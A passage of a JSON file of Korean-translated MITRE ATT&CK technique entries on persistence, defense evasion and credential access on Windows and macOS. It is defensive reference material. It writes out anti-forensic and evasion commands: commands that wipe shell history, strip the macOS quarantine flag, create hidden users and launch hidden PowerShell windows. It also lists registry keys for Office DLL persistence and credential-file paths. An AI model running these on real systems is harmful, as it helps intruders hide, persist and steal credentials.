특정 서비스 계정 개념이 없지만, 리소스에 역할을 가정하는 권한이 직접 부여될 수 있습니다.(인용: AWS 인스턴스 프로필)(인용: AWS 람다 실행 역할)\n\n위험요소는 특정 클라우드 서비스에만 접근할 수 있는 계정을 생성할 수 있으며, 이는 탐지 가능성을 줄일 수 있습니다.\n\n위험요소가 클라우드 계정을 생성한 후, 그 계정을 조작하여 지속성을 확보하고 추가 리소스에 대한 접근을 허용할 수 있습니다. 예를 들어, [추가 클라우드 자격 증명](https://attack.mitre.org/techniques/T1098/001)을 추가하거나 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)을 할당함으로써 이를 달성할 수 있습니다.",
      "external_id": "T1136.003",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Cloud Account",
      "translated": true
    },
    {
      "description": "공격자는 시작 시 지속성을 위해 Microsoft Office 기반 애플리케이션을 활용할 수 있습니다. Microsoft Office는 기업 네트워크 내의 Windows 기반 운영 체제에서 일반적으로 사용되는 애플리케이션 제품군입니다. Office 기반 애플리케이션이 시작될 때 지속성을 위해 사용할 수 있는 여러 메커니즘이 있으며, 이는 Office 템플릿 매크로 및 추가 기능을 포함할 수 있습니다.\n\nOutlook에서 지속성을 얻기 위해 악용될 수 있는 다양한 기능이 발견되었습니다. 예를 들어 Outlook 규칙, 양식 및 시작 페이지가 이에 해당합니다.(출처: SensePost Ruler GitHub) 이러한 지속성 메커니즘은 Outlook 내에서 작동하거나 Office 365를 통해 사용할 수 있습니다.(출처: TechNet O365 Outlook Rules)",
      "external_id": "T1137",
      "modified": "2024-10-15T16:01:21.255Z",
      "title": "Office Application Startup",
      "translated": true
    },
    {
      "description": "적대자는 Microsoft Office 템플릿을 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Microsoft Office에는 일반적인 Office 응용 프로그램의 일부분으로 스타일을 사용자 정의하는 데 사용되는 템플릿이 포함되어 있습니다. 응용 프로그램 내의 기본 템플릿은 각 응용 프로그램이 시작될 때마다 사용됩니다. (출처: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) 매크로(출처: MSDN VBA in Office)는 기본 템플릿에 삽입되어 해당 Office 응용 프로그램이 시작될 때 코드를 실행하여 지속성을 확보하는 데 사용될 수 있습니다. Word와 Excel 모두에 대한 예제가 발견되어 발표되었습니다. 기본적으로 Word에는 악성 매크로를 포함하도록 수정할 수 있는 Normal.dotm 템플릿이 생성됩니다. Excel은 기본적으로 템플릿 파일이 생성되지 않지만, 자동으로 로드될 템플릿을 추가할 수 있습니다.(출처: enigma0x3 normal.dotm)(출처: Hexacorn Office Template Macros) 공유 템플릿은 원격 위치에서 저장되고 불러올 수도 있습니다.(출처: GlobalDotName Jun 2019) \n\nWord Normal.dotm 위치:<br>\n<code>C:\\Users\\&lt;사용자 이름&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb 위치:<br>\n<code>C:\\Users\\&lt;사용자 이름&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\n적대자는 또한 애플리케이션의 검색 순서를 탈취하여 기본 템플릿의 위치를 자신의 것으로 변경할 수 있습니다. 예를 들어, Word 2016은 우선 <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>에서 Normal.dotm을 찾습니다. 또는 GlobalDotName 레지스트리 키를 수정함으로써도 가능합니다. GlobalDotName 레지스트리 키를 수정하면 적대자는 응용 프로그램 시작 시 로드될 템플릿의 임의의 위치, 파일 이름 및 파일 확장자를 지정할 수 있습니다. GlobalDotName을 악용하기 위해서 적대자는 템플릿을 신뢰하는 문서로 등록하거나 신뢰할 수 있는 위치에 배치해야 할 수도 있습니다.(출처: GlobalDotName Jun 2019)\n\n적대자는 매크로 사용에 대한 시스템 또는 기업 보안 정책에 따라 제한 없이 매크로를 실행하기 위해 매크로를 활성화해야 할 수도 있습니다.",
      "external_id": "T1137.001",
      "modified": "2024-10-15T16:01:35.918Z",
      "title": "Office Template Macros",
      "translated": true
    },
    {
      "description": "공격자는 Microsoft Office의 \"Office Test\" 레지스트리 키를 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Office Test 레지스트리 위치는 사용자가 Office 애플리케이션이 시작될 때마다 실행될 임의의 DLL을 지정할 수 있도록 합니다. 이 레지스트리 키는 Microsoft가 Office 애플리케이션을 개발하는 동안 테스트 및 디버깅 목적으로 DLL을 로드하는 데 사용되는 것으로 알려져 있습니다. 이 레지스트리 키는 Office 설치 중에 기본적으로 생성되지 않습니다. (출처: Hexacorn Office Test) (출처: Palo Alto Office Test Sofacy)\n\nOffice Test 기능에는 사용자 및 전역 레지스트리 키가 존재합니다. 예를 들면:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\n공격자는 이 레지스트리 키를 추가하고 Word나 Excel과 같은 Office 애플리케이션이 시작될 때마다 실행될 악성 DLL을 지정할 수 있습니다.",
      "external_id": "T1137.002",
      "modified": "2024-10-15T16:01:48.325Z",
      "title": "Office Test",
      "translated": true
    },
    {
      "description": "공격자는 Microsoft Outlook 양식을 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Outlook 양식은 Outlook 메시지의 프레젠테이션 및 기능을 위한 템플릿으로 사용됩니다. 맞춤형 Outlook 양식을 생성하여 공격자가 동일한 맞춤형 Outlook 양식을 사용하여 특정하게 조작된 이메일을 보낼 때 코드가 실행되도록 할 수 있습니다. (출처: SensePost Outlook Forms)\n\n악성 양식이 사용자 메일박스에 추가되면 Outlook이 시작될 때 로드됩니다. 공격자가 특정하게 조작된 이메일을 사용자에게 보낼 때 악성 양식이 실행됩니다. (출처: SensePost Outlook Forms)",
      "external_id": "T1137.003",
      "modified": "2024-10-15T16:02:00.782Z",
      "title": "Outlook Forms",
      "translated": true
    },
    {
      "description": "위협 행위자는 Microsoft Outlook의 홈 페이지 기능을 활용하여 침해된 시스템에서 지속성을 유지할 수 있습니다. Outlook 홈 페이지는 Outlook 폴더의 표시 방식을 사용자 정의하는 데 사용되는 레거시 기능입니다. 이 기능은 폴더가 열릴 때 내부 또는 외부 URL을 로드하고 표시할 수 있도록 합니다. 악성 HTML 페이지를 제작하여 Outlook 홈 페이지에 의해 로드될 때 코드를 실행할 수 있습니다. (출처: SensePost Outlook Home Page)\n\n악성 홈 페이지가 사용자의 메일박스에 추가되면, Outlook이 시작될 때 로드됩니다. 악성 홈 페이지는 올바른 Outlook 폴더가 로드되거나 새로 고침될 때 실행됩니다. (출처: SensePost Outlook Home Page)",
      "external_id": "T1137.004",
      "modified": "2024-10-15T16:02:13.742Z",
      "title": "Outlook Home Page",
      "translated": true
    },
    {
      "description": "공격자는 Microsoft Outlook 규칙을 악용하여 손상된 시스템에 대한 지속성을 확보할 수 있습니다. Outlook 규칙은 사용자가 이메일 메시지를 관리하기 위해 자동화된 동작을 정의할 수 있도록 합니다. 예를 들어, 일반적인 규칙은 특정 발신자의 특정 단어를 포함하는 이메일을 자동으로 Outlook의 특정 폴더로 이동시키는 것입니다. 악의적인 Outlook 규칙은 공격자가 특정하게 조작된 이메일을 해당 사용자에게 보낼 때 코드 실행을 유발하도록 생성될 수 있습니다. (인용: SilentBreak Outlook Rules)\n\n악의적인 규칙이 사용자의 사서함에 추가되면 Outlook이 시작될 때 로드됩니다. 공격자가 특정하게 조작된 이메일을 사용자에게 보낼 때 악의적인 규칙이 실행됩니다. (인용: SilentBreak Outlook Rules)",
      "external_id": "T1137.005",
      "modified": "2024-10-15T16:02:26.206Z",
      "title": "Outlook Rules",
      "translated": true
    },
    {
      "description": "공격자는 Microsoft Office 애드인을 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Office 애드인은 Office 프로그램에 기능을 추가하는 데 사용될 수 있습니다. 다양한 Office 제품에서 사용할 수 있는 다양한 유형의 애드인이 있으며, 여기에는 Word/Excel 애드인 라이브러리(WLL/XLL), VBA 애드인, Office 구성 요소 개체 모델(COM) 애드인, 자동화 애드인, VBA 편집기(VBE), Visual Studio Tools for Office(VSTO) 애드인, 그리고 Outlook 애드인이 포함됩니다.\n\n애드인은 Office 응용 프로그램이 시작될 때 코드를 실행하도록 설정할 수 있기 때문에 지속성을 확보하는 데 사용될 수 있습니다.",
      "external_id": "T1137.006",
      "modified": "2024-10-15T15:37:09.190Z",
      "title": "Add-ins",
      "translated": true
    },
    {
      "description": "Microsoft Windows 애플리케이션 호환성 인프라/프레임워크(애플리케이션 심)는 운영 체제 코드베이스가 시간이 지남에 따라 변화함에 따라 소프트웨어의 이전 버전과의 호환성을 허용하기 위해 만들어졌습니다. 예를 들어, 애플리케이션 심 기능은 개발자가 Windows XP용으로 제작된 애플리케이션을 Windows 10에서 작동할 수 있도록 코드 재작성 없이 수정할 수 있게 해줍니다. (출처: Elastic Process Injection 2017년 7월) 이 프레임워크 내에서, 심은 프로그램(보다 구체적으로는, 가져오기 주소 테이블)과 Windows OS 간의 완충 역할을 수행하도록 만들어집니다. 프로그램이 실행되면 심 캐시가 참조되어 프로그램이 심 데이터베이스(.sdb)를 사용할 필요가 있는지 결정합니다. 필요한 경우, 심 데이터베이스는 [후킹](https://attack.mitre.org/techniques/T1179)을 사용하여 OS와 통신하기 위해 필요한 코드로 리디렉션합니다.\n\n기본 Windows 설치 프로그램(sdbinst.exe)에 의해 현재 설치된 모든 심의 목록은 다음 위치에 저장됩니다:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\n사용자 정의 데이터베이스는 다음 위치에 저장됩니다:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\n심을 안전하게 유지하기 위해 Windows는 심이 사용자 모드에서 실행되도록 설계하였으므로 커널을 수정할 수 없으며 심을 설치하려면 관리자 권한이 필요합니다. 그러나 특정 심은 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1088)(UAC)(RedirectEXE), 프로세스에 DLL 주입(InjectDLL), 데이터 실행 방지 비활성화(DisableNX) 및 구조적 예외 처리 비활성화(DisableSEH), 메모리 주소 가로채기(GetProcAddress)에 사용할 수 있습니다. [후킹](https://attack.mitre.org/techniques/T1179)과 유사하게, 이러한 심을 활용하면 공격자가 권한 상승, 백도어 설치, Windows Defender와 같은 방어 기제 비활성화 등 여러 악의적인 행동을 수행할 수 있는 가능성이 있습니다.",
      "external_id": "T1138",
      "modified": "2020-11-10T18:29:30.362Z",
      "title": "Application Shimming",
      "translated": true
    },
    {
      "description": "Bash는 사용자가 커맨드 라인에 입력하는 명령어를 \"history\" 유틸리티를 통해 추적합니다. 사용자가 로그아웃하면, 기록된 명령어는 사용자의 <code>.bash_history</code> 파일로 저장됩니다. 각 사용자에 대해 이 파일은 동일한 위치에 있습니다: <code>~/.bash_history</code>. 일반적으로 이 파일은 사용자의 마지막 500개의 명령어를 기록합니다. 사용자들은 종종 커맨드 라인에서 프로그램의 매개변수로 사용자 이름과 비밀번호를 입력하는데, 로그아웃 시 이 정보가 파일에 저장됩니다. 공격자들은 이 파일을 통해 잠재적인 자격 증명을 찾아 악용할 수 있습니다. (출처: DA 외부, OS X 방법)",
      "external_id": "T1139",
      "modified": "2020-02-04T13:03:03.354Z",
      "title": "Bash History",
      "translated": true
    },
    {
      "description": "공격자는 [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)를 사용하여 분석으로부터 침입 흔적을 숨길 수 있습니다. 그들이 정보를 사용하는 방식에 따라 해당 정보를 디코딩하거나 디오브푸스케이팅하기 위한 별도의 메커니즘이 필요할 수 있습니다. 이를 수행하는 방법으로는 맬웨어의 내장 기능이나 시스템에 존재하는 유틸리티를 사용하는 것이 포함됩니다.\n\n한 가지 예로, 원격 액세스 도구의 포터블 실행 파일을 인증서 파일 내에 숨겨진 형태로 디코딩하기 위해 [certutil](https://attack.mitre.org/software/S0160)을 사용하는 경우가 있습니다. (출처: Malwarebytes의 사우디 아라비아에 대한 표적 공격) 또 다른 예로는 Windows의 <code>copy /b</code> 명령어를 사용하여 이진 조각을 악성 페이로드로 재조립하는 경우가 있습니다. (출처: Carbon Black Obfuscation, 2016년 9월)\n\n때때로 사용자의 행동이 디오브푸스케이팅이나 복호화의 일환으로 파일을 여는 데 필요할 수 있습니다. 사용자는 또한 공격자가 제공한 비밀번호 보호된 압축/암호화 파일을 열기 위해 비밀번호를 입력해야 할 수도 있습니다. (출처: Volexity PowerDuke, 2016년 11월)",
      "external_id": "T1140",
      "modified": "2023-08-14T19:28:18.334Z",
      "title": "Deobfuscate/Decode Files or Information",
      "translated": true
    },
    {
      "description": "프로그램이 현재 사용자 컨텍스트에서 제공되는 권한보다 추가 권한이 필요한 경우, 운영 체제는 일반적으로 사용자가 작업에 대한 상승된 권한을 승인하기 위해 적절한 자격 증명을 입력하도록 요청합니다(예: [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1088)).\n\n공격자는 정상적인 사용을 모방하는 여러 가지 이유로, 추가 접근 권한이 필요한 가짜 설치 프로그램이나 가짜 맬웨어 제거 도구와 같은 겉보기에 정당한 프롬프트로 사용자가 자격 증명을 입력하도록 유도하기 위해 이 기능을 모방할 수 있습니다. (출처: OSX 맬웨어, MacKeeper 악용) 이러한 유형의 프롬프트는 [AppleScript](https://attack.mitre.org/techniques/T1155)(출처: LogRhythm Do You Trust, 2014년 10월)(출처: OSX Keydnap 맬웨어) 및 [PowerShell](https://attack.mitre.org/techniques/T1086)(출처: LogRhythm Do You Trust, 2014년 10월)(출처: Enigma Phishing for Credentials, 2015년 1월)와 같은 다양한 언어를 통해 자격 증명을 수집하는 데 사용될 수 있습니다.",
      "external_id": "T1141",
      "modified": "2020-02-12T16:34:06.412Z",
      "title": "Input Prompt",
      "translated": true
    },
    {
      "description": "키체인은 macOS에서 사용자 비밀번호 및 다양한 서비스와 기능에 대한 인증 정보를 추적하는 기본 방법입니다. 여기에는 WiFi 비밀번호, 웹사이트, 보안 메모, 인증서 및 Kerberos가 포함됩니다. 키체인 파일은 <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, <code>/Network/Library/Keychains/</code>에 위치해 있습니다. (출처: 위키백과 키체인) macOS에 기본적으로 포함된 <code>security</code> 명령줄 유틸리티는 이러한 인증 정보를 관리하는 데 유용한 방법을 제공합니다.\n\n사용자는 키체인에 접근하기 위해 추가 인증 정보를 사용해야 합니다. 만약 침해자가 로그인 키체인에 대한 인증 정보를 알고 있다면, 이 저장소에 저장된 모든 다른 인증 정보에 접근할 수 있습니다. (출처: DA 외부, OS X 방식) 기본적으로 키체인의 비밀번호는 사용자의 로그인 인증 정보입니다.",
      "external_id": "T1142",
      "modified": "2020-02-12T18:55:55.305Z",
      "title": "Keychain",
      "translated": true
    },
    {
      "description": "공격자는 사용자의 눈에 보이지 않도록 악성 활동을 숨기기 위해 숨겨진 창을 구현할 수 있습니다. 일부 경우, 애플리케이션이 작업을 수행할 때 일반적으로 표시되는 창을 숨길 수 있습니다. 이는 시스템 관리자가 관리 작업을 수행할 때 사용자 작업 환경을 방해하지 않기 위해 활용할 수 있습니다. 공격자는 운영 체제 기능을 악용하여 사용자에게 보이는 창을 숨겨 사용자에게 공격자의 활동이 감지되지 않도록 할 수 있습니다.\n\n### Windows\nWindows에서는 스크립팅 언어에서 여러 가지 기능이 있으며, PowerShell, Jscript, VBScript 등이 창을 숨기는 데 사용됩니다. 그 예시로는 <code>powershell.exe -WindowStyle Hidden</code>이 있습니다. (출처: PowerShell About 2019)\n\n### Mac\nmacOS에서 애플리케이션이 실행되는 방식에 대한 설정은 속성 목록(plist) 파일에 나열됩니다. 이 파일들에서 나타날 수 있는 태그 중 하나는 <code>apple.awt.UIElement</code>로, Java 애플리케이션이 애플리케이션 아이콘이 Dock에 표시되지 않도록 할 수 있습니다. 일반적으로 애플리케이션이 시스템 트레이에서 실행되지만 Dock에 나타나지 않기를 원할 때 사용됩니다. 하지만 공격자는 이 기능을 악용하여 실행 중인 창을 숨길 수 있습니다. (출처: 구식 Mac 맬웨어)",
      "external_id": "T1143",
      "modified": "2020-03-13T21:03:18.600Z",
      "title": "Hidden Window",
      "translated": true
    },
    {
      "description": "macOS와 OS X에서, 인터넷에서 다운로드된 애플리케이션이나 프로그램에는 <code>com.apple.quarantine</code>라는 특별한 속성이 파일에 설정됩니다. 이 속성은 실행 시 애플의 Gatekeeper 방어 프로그램에 의해 읽혀지며, 사용자에게 실행을 허용할 것인지 거부할 것인지에 대한 프롬프트를 제공합니다.\n\nUSB 플래시 드라이브, 광디스크, 외장 하드 드라이브 또는 로컬 네트워크를 통해 공유된 드라이브에서 시스템에 로드된 앱은 이 플래그를 설정하지 않습니다. 또한, 드라이브 바이 다운로드와 같은 다른 유틸리티나 이벤트 역시 이 플래그를 설정하지 않을 수 있습니다. 이는 내장된 Gatekeeper 확인을 완전히 우회합니다. (출처: 맥 맬웨어 지속성 방법) 격리 플래그의 존재는 <code>xattr /path/to/MyApp.app</code> 명령어로 <code>com.apple.quarantine</code>를 확인할 수 있습니다. 유사하게, sudo 접근 권한이나 상승된 권한이 주어지면, 이 속성은 xattr로 제거할 수 있습니다, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (출처: 격리 속성 제거하기) (출처: OceanLotus for OS X)\n\n일반적으로 파일이 인터넷에서 다운로드되고 격리 플래그가 설정된 후 디스크에 저장됩니다. 사용자가 파일이나 애플리케이션을 열려고 할 때, macOS의 Gatekeeper가 개입하여 이 플래그의 존재를 확인합니다. 만약 존재한다면, macOS는 사용자가 프로그램을 실행하고 싶어하는지를 확인하도록 프롬프트를 제공하며, 애플리케이션의 출처 URL도 안내합니다. 그러나 이는 모두 격리 인식 애플리케이션에서 다운로드된 파일에 기반합니다. (출처: Gatekeeper 우회하기)",
      "external_id": "T1144",
      "modified": "2020-02-05T16:23:01.683Z",
      "title": "Gatekeeper Bypass",
      "translated": true
    },
    {
      "description": "개인 비밀 키와 인증서는 인증, 암호화/복호화 및 디지털 서명에 사용됩니다. (출처: Wikipedia 공개 키 암호화)\n\n공격자는 타겟 시스템에서 손상된 비밀 키를 수집하여 SSH와 같은 [원격 서비스](https://attack.mitre.org/techniques/T1021)에 인증하거나 이메일과 같은 수집된 다른 파일을 복호화하는 데 사용할 수 있습니다. 일반적인 키와 인증서 파일 확장자는 다음과 같습니다: .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc. 공격자는 또한 * nix 기반 시스템의 경우 <code>~/.ssh</code>와 같은 일반 키 디렉토리나 Windows의 경우 <code>C:\\Users\\(username)\\.ssh\\</code>를 검색할 수 있습니다.\n\n비밀 키는 작동을 위해 비밀번호 또는 패스프레이즈를 요구해야 하므로, 공격자는 [입력 캡처](https://attack.mitre.org/techniques/T1056) 기술을 사용하여 키로깅을 하거나 오프라인에서 패스프레이즈를 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110) 시도할 수 있습니다.\n\n공격자 도구는 손상된 시스템에서 암호화 키와 인증서와 관련된 파일 확장자를 검색하는 기능이 발견되었습니다. (출처: Kaspersky Careto) (출처: Palo Alto Prince of Persia)",
      "external_id": "T1145",
      "modified": "2020-02-18T16:51:57.775Z",
      "title": "Private Keys",
      "translated": true
    },
    {
      "description": "시스템 로그를 삭제하는 것 외에도, 공격자는 침해된 계정의 명령 기록을 삭제하여 침입 중 수행한 작업을 숨길 수 있습니다. macOS와 Linux 모두 사용자가 터미널에 입력한 명령을 추적하여 사용자가 수행한 작업을 되짚어볼 수 있도록 합니다. 이러한 로그는 몇 가지 방법으로 접근할 수 있습니다. 사용자가 로그인 할 때, 이 명령 기록은 환경 변수 <code>HISTFILE</code>가 가리키는 파일에 저장됩니다. 사용자가 시스템에서 로그오프 하면, 이 정보는 사용자 홈 디렉토리의 <code>~/.bash_history</code>라는 파일로 플러시됩니다. 이러한 행위의 이점은 사용자가 이전 세션에서 사용했던 명령으로 돌아갈 수 있도록 해줍니다. 명령줄에 입력된 모든 내용이 저장되므로, 명령줄에 전달된 비밀번호도 저장됩니다. 공격자는 이러한 파일에서 평문 비밀번호를 검색하여 이를 악용할 수 있습니다. 또한, 공격자는 <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>와 같은 다양한 방법을 사용하여 자신의 명령이 이러한 로그에 나타나는 것을 방지할 수 있습니다.",
      "external_id": "T1146",
      "modified": "2020-01-31T12:32:52.281Z",
      "title": "Clear Command History",
      "translated": true
    },
    {
      "description": "macOS의 모든 사용자 계정에는 해당 사용자 계정에 연결된 사용자 ID(userID)가 있습니다. 사용자를 생성할 때, 해당 계정의 사용자 ID를 지정할 수 있습니다. <code>/Library/Preferences/com.apple.loginwindow</code> 경로의 <code>Hide500Users</code>라는 속성 값은 사용자 ID가 500 이하인 사용자들이 로그인 화면에 나타나는 것을 방지합니다. 공격자는 [계정 생성(Create Account)](https://attack.mitre.org/techniques/T1136) 기법을 사용하여 사용자 ID를 500 이하로 설정하고 이 속성을 활성화(값을 Yes로 설정)함으로써 자신의 사용자 계정을 훨씬 더 쉽게 숨길 수 있습니다: <code>sudo dscl . -create /Users/username UniqueID 401</code> (출처: Cybereason OSX Pirrit).",
      "external_id": "T1147",
      "modified": "2021-12-21T16:28:00.431Z",
      "title": "Hidden Users",
      "translated": true
    },
    {
      "description": "<code>HISTCONTROL</code> 환경 변수는 사용자가 로그아웃할 때 <code>history</code> 명령어가 무엇을 저장해야 하는지를 추적하며, 결국 <code>~/.bash_history</code> 파일에 저장됩니다. 이 설정은 공백으로 시작하는 명령어를 무시하도록 \"ignorespace\"로 설정하여 구성할 수 있습니다. <code>HISTCONTROL</code>은 중복된 명령어를 무시하도록 \"ignoredups\"로 설정할 수도 있습니다. 일부 리눅스 시스템에서는 기본적으로 \"ignoreboth\"로 설정되어 있어, 위의 두 가지 예를 모두 포함합니다. 이는 \" ls\"는 저장되지 않지만, \"ls\"는 기록에 저장된다는 것을 의미합니다. <code>HISTCONTROL</code>은 macOS에서는 기본적으로 존재하지 않지만, 사용자가 설정할 수 있으며 이 설정은 존중됩니다. 공격자는 모든 터미널 명령어 앞에 공백을 추가함으로써 흔적을 남기지 않고 작동할 수 있습니다.",
      "external_id": "T1148",
      "modified": "2020-02-21T20:57:38.015Z",
      "title": "HISTCONTROL",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않으며, 권장되지 않습니다.**\n\nOS X 10.8부터 mach-O 바이너리에는 실행을 위한 바이너리의 진입점을 가리키는 새로운 헤더인 LC_MAIN이 도입되었습니다. 이전에는 이러한 효과를 달성하기 위해 LC_THREAD와 LC_UNIXTHREAD라는 두 개의 헤더가 사용되었습니다 (인용: Prolific OSX Malware History). 바이너리의 진입점은 악성 추가 항목(다른 섹션이나 코드 동굴)으로 초기 실행 흐름을 변경할 수 있으며, 그 이후에 다시 초기 진입점으로 돌아가게 할 수 있어 피해자는 차이를 알지 못하게 됩니다 (인용: Methods of Mac Malware Persistence). 이러한 방식으로 바이너리를 수정하면 파일 이름이나 애플리케이션 경로가 여전히 동일하기 때문에 애플리케이션 화이트리스트를 우회할 수 있습니다.",
      "external_id": "T1149",
      "modified": "2020-03-30T13:53:57.518Z",
      "title": "LC_MAIN Hijacking",
      "translated": true
    },
    {
      "description": "속성 목록(plist) 파일은 macOS 및 OS X가 애플리케이션과 서비스를 구성하는 데 사용하는 모든 정보를 포함하고 있습니다. 이 파일들은 UTF-8로 인코딩되어 있으며, 일련의 < >로 둘러싸인 키를 통해 XML 문서 형식으로 구성됩니다. 이들은 프로그램이 언제 실행되어야 하는지, 실행 파일의 경로, 프로그램 인수, 필요한 OS 권한 등 다양한 세부 정보를 담고 있습니다. plist 파일은 그 용도에 따라 특정 위치에 저장되며, 예를 들어 <code>/Library/Preferences</code>는 상승된 권한으로 실행되는 반면 <code>~/Library/Preferences</code>는 사용자의 권한으로 실행됩니다. \n적대자는 이러한 plist 파일을 수정하여 자신의 코드로 포인팅하거나, 다른 사용자의 맥락에서 자신의 코드를 실행하거나, 화이트리스트 절차를 우회하거나, 심지어 지속성을 유지하는 메커니즘으로 사용할 수도 있습니다. (인용: Sofacy Komplex 트로이안)",
      "external_id": "T1150",
      "modified": "2022-04-22T18:49:20.520Z",
      "title": "Plist Modification",
      "translated": true
    },
    {
      "description": "적대자는 파일의 확장자를 변경하여 프로그램의 실제 파일 유형을 숨길 수 있습니다. 특정 파일 유형에 대해서(특히 .app 확장자에는 적용되지 않음), 파일 이름 끝에 공백을 추가하면 운영 체제가 파일을 처리하는 방식이 달라집니다. 예를 들어, evil.bin이라는 Mach-O 실행 파일이 있을 때, 사용자가 이 파일을 두 번 클릭하면 Terminal.app가 실행됩니다. 그러나 이 파일의 이름을 evil.txt로 변경하면, 사용자가 두 번 클릭할 경우 기본 텍스트 편집 애플리케이션이 실행되고 이진 파일은 실행되지 않습니다. 하지만 파일 이름을 \"evil.txt \" (끝에 공백이 있음)로 변경하면, 사용자가 두 번 클릭할 때 운영 체제에서 실제 파일 유형이 결정되어 올바르게 처리되며 이진 파일이 실행됩니다(출처: Mac 백도어가 돌아왔다).\n\n적대자는 이 기능을 이용하여 사용자가 악의적이지 않은 것처럼 보이는 파일을 두 번 클릭하게 속이고 궁극적으로 악성 코드가 실행되도록 할 수 있습니다.",
      "external_id": "T1151",
      "modified": "2020-02-10T20:49:12.897Z",
      "title": "Space after Filename",
      "translated": true
    },
    {
      "description": "Launchctl은 macOS의 launchd 프로세스를 제어하며, 이는 런치 에이전트 및 런치 데몬과 같은 작업을 처리하지만, 자체적으로 다른 명령이나 프로그램을 실행할 수도 있습니다. Launchctl은 명령줄, 대화형 모드 또는 표준 입력에서 리디렉션된 작업을 지원하는 서브 커맨드를 포함할 수 있습니다. 런치 에이전트 또는 런치 데몬을 로드하거나 재로딩함으로써 적대자는 지속성을 설치하거나 자신이 변경한 내용을 실행할 수 있습니다 (참조: Sofacy Komplex Trojan). Launchctl에서 명령을 실행하는 것은 <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\"</code>와 같은 간단한 작업입니다. 런치 에이전트 또는 런치 데몬을 로드, 언로드 또는 재로딩하려면 상승된 권한이 필요할 수 있습니다.\n\n적대자들은 이 기능을 악용하여 코드를 실행하거나 launchctl이 허용된 프로세스일 경우 화이트리스트를 우회할 수 있습니다.",
      "external_id": "T1152",
      "modified": "2020-03-10T18:31:00.336Z",
      "title": "Launchctl",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않으며, 폐기되었습니다.**\n\n<code>source</code> 명령은 현재 셸에 함수를 로드하거나 현재 컨텍스트에서 파일을 실행합니다. 이 내장 명령은 두 가지 방식으로 실행될 수 있습니다: <code>source /path/to/filename [arguments]</code> 또는 <code>./path/to/filename [arguments]</code>. 여기서 \".\" 뒤에 공백이 있다는 점에 유의하세요. 공백 없이 실행하면 새로운 셸이 생성되어 프로그램이 실행되며, 현재 컨텍스트 내에서 프로그램이 실행되지 않습니다. 이는 특정 기능이나 함수를 셸에서 사용할 수 있도록 하거나 특정 셸의 환경을 업데이트하는 데 자주 사용됩니다. (출처: Source Manual)\n\n공격자는 이 기능을 악용하여 프로그램을 실행할 수 있습니다. 이 기술로 실행되는 파일은 미리 실행 가능으로 표시될 필요가 없습니다.",
      "external_id": "T1153",
      "modified": "2020-03-30T13:40:14.512Z",
      "title": "Source",
      "translated": true
    },
    {
      "description": "<code>trap</code> 명령은 프로그램과 쉘이 중단 신호를 받을 때 실행할 명령을 지정할 수 있게 합니다. 일반적인 상황은 스크립트가 <code>ctrl+c</code> 및 <code>ctrl+d</code>와 같은 일반적인 키보드 중단을 우아하게 종료하고 처리할 수 있도록 하는 것입니다. 공격자들은 특정 중단이 발생했을 때 실행될 코드를 등록하기 위해 이를 사용할 수 있으며, 이는 실행 권한을 얻거나 지속성 메커니즘으로 사용될 수 있습니다. Trap 명령의 형식은 <code>trap '명령 목록' 신호</code>이며, 여기서 \"명령 목록\"은 \"신호\"가 수신되었을 때 실행됩니다. (출처: Trap 매뉴얼)(출처: Cyberciti Trap 문구)",
      "external_id": "T1154",
      "modified": "2020-01-24T14:18:13.478Z",
      "title": "Trap",
      "translated": true
    },
    {
      "description": "macOS 및 OS X 애플리케이션은 상호 프로세스 통신(IPC)을 위해 서로에게 AppleEvent 메시지를 전송합니다. 이러한 메시지는 AppleScript를 사용하여 로컬 또는 원격 IPC를 위해 쉽게 스크립팅할 수 있습니다. Osascript는 AppleScript 및 기타 Open Scripting Architecture (OSA) 언어 스크립트를 실행합니다. 시스템에 설치된 OSA 언어 목록은 <code>osalang</code> 프로그램을 사용하여 확인할 수 있습니다.\n\nAppleEvent 메시지는 독립적으로 또는 스크립트의 일부로 전송될 수 있습니다. 이러한 이벤트는 열려 있는 창을 찾고, 키 입력을 전송하며, 거의 모든 열린 애플리케이션과 로컬 및 원격으로 상호작용할 수 있습니다.\n\n공격자는 이를 사용하여 열려 있는 SSH 연결과 상호작용하고, 원격 머신으로 이동하며, 사용자에게 가짜 대화 상자를 표시할 수 있습니다. 이러한 이벤트는 원격으로 애플리케이션을 시작할 수는 없지만(로컬에서 시작은 가능), 이미 원격에서 실행 중인 애플리케이션과 상호작용할 수 있습니다. 스크립팅 언어이기 때문에, 파이썬을 통한 리버스 셸과 같은 더 일반적인 기술을 실행하는 데도 사용될 수 